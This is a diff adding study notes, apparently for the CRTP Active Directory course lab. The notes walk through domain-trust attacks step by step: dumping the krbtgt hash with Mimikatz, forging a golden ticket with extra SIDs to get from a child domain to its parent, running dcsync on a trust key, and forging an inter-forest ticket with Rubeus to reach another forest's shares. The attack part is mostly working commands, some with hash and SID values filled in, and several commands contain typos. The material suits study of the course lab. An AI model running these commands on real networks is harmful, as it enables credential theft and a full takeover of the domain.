@@ -2391,3 +2391,103 @@ klist
 dir \\mcorp-dc.moneycorp.local\C$
 ```
 now you can access the shared file of the enterprise admin
+
+# Priv Esc - Child to Parent using krbtgt hash
+assume that we have a domain called dollarcorp.moneycorp.local. the dollarcorp is considered the child or son of moneycorp
+
+so, if we assume that we have reached the private Domain Controller in the dollarcorp, but we would like to reach the private Doman Controller in the parent, which is moneycorp.local
+
+Requirements:
+
+1. SID of the enterprise admins group
+2. SID of dollarcorp Domain
+3. hashKrbtgt
+
+### Explanation
+1. Load for the PowerView_dev tool using this command
+```
+Import-Moudle .\PowerView_dev.ps1
+```
+2. extract the SID in the Enterprise Admins group located in the domain moneycorp
+```
+Get-NetGroup -Identity "Enterprise Admins" -Domain moneycorp.local
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5f400e97-f608-4446-a59e-d72564a26542)
+
+3. extract SID of dollarcorp domain
+```
+Get-DomainSID
+```
+
+4. The third requirement is present in the Domain Controller of the child, which is Dollarcorp. I will access the Domain Controller through this command since I have a user in the Domain Admins group in the dollarcorp domain
+```
+Enter-PSSession -ComputerName dcorp-dc
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cfbd5807-2707-4d55-928b-fcd73f9e04eb)
+
+5. extract the hash of krbtgt using the Mimikatz tool using this command
+```
+.\mimikatz.exe "lsadump::lsa /patch" "exit"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/99744ce4-4d9c-4609-927f-32b370a8fc36)
+
+Now we have extracted all the requirements that will lead us to the private Domian Controller in the father, which is moneycorp
+
+Now I will open a Powershell session with Administrator privileges
+
+6. I will execute a command using the Mimikatz tool to obtain the TGS in the krbtgt service
+```
+kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:<NTLM> /sid:<SID of Domain Admin> /sids:<SID of Enterprise Admins Group> /ptt
+kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e6f16001-70b5-4970-b33b-1721a4a8958c)
+
+7. Tgs of the service, krbtgr will be injected into the memory. To be sure, we will execute this command
+```
+klist
+```
+8. Now, in more than one way, we will be able to execute the OS command on the private Domain Controller in the father's moneycorp. We can implement dcsync so that we take the NTLM Hahs of the Administrator located in the father's domain. After that, you set your password PassTheHash and enter the device or execute schuldeing tasks, but these two methods are long and take time in the process. Others are faster
+
+The other way is to download the PsExec tool from the Microsoft website and enter the private Domain Controller in the father's moneycorp via this command
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/71f62423-8d6a-422f-be51-26599e257ba0)
+
+we were able to access the father’s domain through the son’s domain
+
+# Access Resources Across Forest
+assume you want to abuse the trust between the erupcorp and moneycorp. Note: you will only be able to access the shared resources
+
+1. you need the trust kee between moneycorp and eurocorp
+```
+SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$" "exit"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/1901a2bd-0794-40ec-a4d6-d8e036132cbc)
+
+2. forge TGS
+```
+BetterSafetyKatz.exe "Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<enterprise admin SID> /rc4:<TrustKey> /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
+```
+3. request a service ticket from the DC of eurocorp
+```
+Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_forest_tkt.kirbi \service:cifs\eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+klist
+```
+4. if you try to access the pc you will not be able
+```
+dir \\eurocorp-dc.eurocorp.local
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3fb9422d-b653-40a3-8120-cde17b83e11d)
+
+because the trust only in the shared resources
+
+5. enumerate the shares
+```
+new view \\eurocorp-dc.eurocorp.local
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/63e50a0d-25b2-4ea0-92c3-2ee7a4ea5e85)
+
+6. now try to access the SharedwithDCorp
+```
+dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/f965943b-a0de-40ca-a601-83ffcac0e599)
